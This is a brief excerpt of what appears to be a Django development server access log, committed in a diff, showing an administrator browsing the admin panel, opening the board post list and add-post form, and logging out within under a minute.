+[22/Jan/2021 04:18:13] "GET /admin/ HTTP/1.1" 200 5807
+[22/Jan/2021 04:18:15] "GET /admin/board/post/ HTTP/1.1" 200 6319
+[22/Jan/2021 04:18:15] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[22/Jan/2021 04:18:15] "GET /static/admin/img/search.svg HTTP/1.1" 200 458
+[22/Jan/2021 04:18:22] "GET /admin/board/post/add/ HTTP/1.1" 200 7743
+[22/Jan/2021 04:18:22] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[22/Jan/2021 04:18:59] "GET /admin/logout/ HTTP/1.1" 200 1511
